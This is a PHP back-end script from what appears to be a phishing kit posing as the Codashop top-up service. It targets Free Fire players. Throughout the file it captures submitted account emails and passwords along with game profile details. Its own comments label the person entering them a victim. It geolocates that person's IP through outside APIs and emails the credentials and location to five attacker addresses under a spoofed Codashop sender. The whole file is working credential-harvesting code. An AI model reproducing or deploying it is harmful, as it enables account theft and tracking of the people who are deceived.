<?php
header('Access-Control-Allow-Origin:*');
header('Access-Control-Allow-Headers:*');
date_default_timezone_set('Asia/Jakarta');
if(isset($_POST['a']))
{

// MENANGKAP DATA YANG DI-INPUT
$user = $_POST['a'];
$pass = $_POST['b'];
$playid = $_POST['c'];
$level = $_POST['d'];
$tier = $_POST['e'];
$rpt = $_POST['f'];
$login = $_POST['g'];
$ip = $_POST['h'];

// MENGAMBIL INFO LOKASI KORBAN
$ch = curl_init('http://ip-api.com/json/'.$ip.'');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$upx = curl_exec($ch);
curl_close($ch);
$rndytech = json_decode($upx, true);

$country = $rndytech['country'];
$region = $rndytech['regionName'];
$city = $rndytech['city'];
$lat = $rndytech['lat'];
$long = $rndytech['lon'];
$timezone = $rndytech['timezone'];
$jamasuk = date('l, d-m-Y h:i:s');

// MENGAMBIL INFO KODE NEGARA
$ch = curl_init('https://api.ipgeolocationapi.com/geolocate/'.$ip.'');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$upx = curl_exec($ch);
curl_close($ch);
$rndycallcode = json_decode($upx, true);
$callcode = $rndycallcode['country_code'];

// MENGAMBIL INFO BENDERA
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,"https://arpanrizki.my.id/api/get_flag2/api.php"); 
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS,"ip=$ip");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$rndytech_flag = curl_exec($ch);
curl_close ($ch);
$exe = explode('-',$rndytech_flag);
$rndytechflag = $exe[1];

// KONTEN RESULT AKUN 
$subjek = "$rndytechflag [+$callcode] | $playid [$level] | login $login";
$pesan = <<<EOD
	<!DOCTYPE html>
					<html>
					<head>
						<title></title>
						<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
						<style type="text/css">
							body {
								font-family: "Helvetica";
								width: 90%;
								display: block;
								margin: auto;
								border: 1px solid #fff;
								background: #fff;
							}

							.result {
								width: 100%;
								height: 100%;
								display: block;
								margin: auto;
								position: fixed;
								top: 0;
								right: 0;
								left: 0;
								bottom: 0;
								z-index: 999;
								overflow-y: scroll;
							}

							.tblResult {
								width: 100%;
								display: table;
								margin: 0px auto;
								border-collapse: collapse;
								text-align: center;
								background: rgba(247,129,129, 0.1);
							}

							.tblResult th {
								text-align: left;
								font-size: 0.75em;
								margin: auto;
								padding: 15px 10px;
								background: #64FE2E;
								border: 2px solid #64FE2E;
								color: #0B0B0B;
							}

							.tblResult td {
								font-size: 0.75em;
								margin: auto;
								padding: 10px;
								border: 2px solid #64FE2E;
								text-align: left;
								font-weight: bold;
								color: #0B0B0B;
								text-shadow: 0px 0px 10px #fff;

							}

							.tblResult th img {
								width: 45px;
								display: block;
								margin: auto;
								border-radius: 50%;
								box-shadow: 0px 0px 10px rgba(0,0,0, 0.5);
							}
						</style>
					</head>
					<body>
		<div class="result">
			<table class="tblResult">
				<tr>
					<th style="text-align: center;" colspan="3">CODA SHOP TRUE-ID</th>
				</tr>
				<tr>
					<td style="border-right: none;">Email Akun</td>
					<td style="text-align: right;">$user</td>
				</tr>
				<tr>
					<td style="border-right: none;">Password Akun</td>
					<td style="text-align: right;">$pass</td>
				</tr>
								<tr>
					<td style="border-right: none;">Login</td>
					<td style="text-align: right;">$login</td>
				</tr>
				<tr>
					<th style="text-align: center;" colspan="3">Detail Akun Free Fire</th>
				</tr>
				<tr>
					<td style="border-right: none;">ID Karakter</td>
					<td style="text-align: right;">$playid</td>
				</tr>
				<tr>
					<td style="border-right: none;">Level Akun</td>
					<td style="text-align: right;">$level</td>
				</tr>
				<tr>
					<td style="border-right: none;">Elite Pass</td>
					<td style="text-align: right;">$rpt</td>
				</tr>
				<tr>
					<td style="border-right: none;">Level Ranked</td>
					<td style="text-align: right;">$tier</td>
				</tr>
				<tr>
					<th style="text-align: center;" colspan="3">Informasi Device</th>
				</tr>
				<tr>
					<td style="border-right: none;">Country</td>
					<td style="text-align: right;">$rndytechflag $country</td>
				</tr>
				<tr>
					<td style="border-right: none;">Region</td>
					<td style="text-align: right;">$region</td>
				</tr>
				<tr>
					<td style="border-right: none;">City</td>
					<td style="text-align: right;">$city</td>
				</tr>
				<tr>
					<td style="border-right: none;">Latitude</td>
					<td style="text-align: right;">$lat</td>
				</tr>			
				<tr>
					<td style="border-right: none;">Longitude</td>
					<td style="text-align: right;">$long</td>
				</tr>
				<tr>
					<td style="border-right: none;">TimeZone</td>
					<td style="text-align: right;">$timezone</td>
				</tr>
				<tr>
					<td style="border-right: none;">IP Address</td>
					<td style="text-align: right;">$ip</td>
				</tr>
				<tr>
                                    <td style="border-right: none;">Jam Masuk</td>
                                    <td style="text-align: right;">$jamasuk</td>
                                </tr>
								<tr>
									<th style="text-align: left;">ＲＩＺＫＩ:</th>
									<th style="text-align: right;">
    									<a href="https://wa.me/6281329445592">
    										<img style="width: 30px; display: inline-block; margin-right: 5px;" src="https://i.ibb.co/0qFS547/RndyWA.png">
    									</a>
    								
    									<a href="https://www.facebook.com/RizRiz.ID">
    										<img style="width: 30px; display: inline-block; margin-right: 5px;" src="https://i.ibb.co/CP5Krzt/download.png">
    									</a>
									</th>
								</tr>
							</table>
						</div>
					</body>
					</html>
EOD;

include 'email.php';
$sender = 'From: CODA SHOP TRUE-ID <codashop@suppots.com>';
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= ''.$sender.'' . "\r\n";
$kirim = mail($email1, $subjek, $pesan, $headers);
$kirim = mail($email2, $subjek, $pesan, $headers);
$kirim = mail($email3, $subjek, $pesan, $headers);
$kirim = mail($email4, $subjek, $pesan, $headers);
$kirim = mail($email5, $subjek, $pesan, $headers);
}else{
    echo 'MT !';
}
?>